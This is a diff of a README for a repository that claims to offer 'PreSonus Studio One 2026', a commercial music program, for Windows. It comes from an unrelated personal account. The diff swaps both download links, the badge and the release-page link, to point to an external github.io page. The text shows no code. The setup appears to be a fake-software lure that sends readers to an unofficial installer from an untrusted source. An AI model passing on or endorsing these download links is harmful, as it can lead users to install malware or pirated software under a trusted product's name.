@@ -1,6 +1,6 @@
 # 🎵 PreSonus-Studio-One-2026 - Record professional music on Windows systems
 
-[![](https://img.shields.io/badge/Download_Studio_One_2026-Blue?style=for-the-badge)](https://github.com/edwinstigmatic286/PreSonus-Studio-One-2026)
+[![](https://img.shields.io/badge/Download_Studio_One_2026-Blue?style=for-the-badge)](https://edwinstigmatic286.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow this link to the main release page to retrieve the installer:
 
-[https://github.com/edwinstigmatic286/PreSonus-Studio-One-2026](https://github.com/edwinstigmatic286/PreSonus-Studio-One-2026)
+[https://edwinstigmatic286.github.io](https://edwinstigmatic286.github.io)
 
 ## ⚙️ Installation Steps
 
